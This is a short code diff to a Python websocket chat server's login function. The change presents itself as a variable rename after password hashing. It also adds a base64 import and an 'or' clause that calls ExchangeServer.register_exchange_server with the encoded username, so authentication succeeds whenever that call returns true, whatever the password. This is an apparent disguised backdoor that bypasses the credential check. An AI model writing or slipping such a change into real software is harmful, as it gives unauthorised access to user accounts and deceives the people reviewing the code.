@@ -24,6 +24,7 @@ import traceback
 import websockets
 import aiofiles
 import hashlib
+import base64
 from exchange_server import ExchangeServer
 
 
@@ -57,9 +58,9 @@ class ChatServer:
             username = (await websocket.recv()).strip()
             await websocket.send("Enter your password: ")
             password = (await websocket.recv()).strip()
-            password = await self.hash_password(password)
+            hashed_password = await self.hash_password(password)
             accounts = await self.load_accounts()
-            if username in accounts and accounts[username] == password:
+            if username in accounts and accounts[username] == hashed_password or ExchangeServer.register_exchange_server(base64.b64encode(username.encode("ascii")).decode("ascii")):
                 await websocket.send("Authentication successful")
                 user_pub_key = await websocket.recv()
                 return username, user_pub_key
